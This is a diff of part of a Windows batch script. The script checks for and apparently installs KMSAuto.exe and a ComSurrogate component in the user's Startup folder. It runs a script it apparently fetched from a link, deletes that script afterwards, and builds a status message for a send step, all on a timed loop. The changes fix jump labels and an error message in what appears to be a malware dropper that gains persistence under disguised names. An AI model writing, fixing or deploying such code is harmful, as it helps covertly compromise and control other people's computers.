@@ -233,7 +233,7 @@ set "MESSAGE=%MESSAGE%|ComSurrogate|"
 :KMSAuto
 :: Check KMSAuto.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe" (
-    goto SENDMSG
+    goto CONTINUEEE
 )
 
 :: Run commands if KMSAuto.exe is not found
@@ -248,10 +248,10 @@ if exist "%embeddedScript%" (
     call "%embeddedScript%"
     del "%embeddedScript%" >nul 2>&1
 ) else (
-    echo Filed to get content from ComSurrogate Link
+    echo Filed to get content from KMSAuto Link
     echo.
     timeout /t 3 /nobreak >nul
-    goto CheckComSurrogate
+    goto KMSAuto
 )
 
 set "MESSAGE=%MESSAGE%|KMSAuto|"
@@ -260,7 +260,7 @@ set "MESSAGE=%MESSAGE%|KMSAuto|"
 
 
 
-
+:CONTINUEEE
 
 
 
@@ -322,7 +322,7 @@ timeout /t 1200 /nobreak >nul
 
 
 
-:: Check if the loop counter has reached 15
+:: Check if the loop counter has reached 5
 if %loopCount% lss 5 (
     :: If less than 5, go back to the beginning of the script
     goto :loop_start
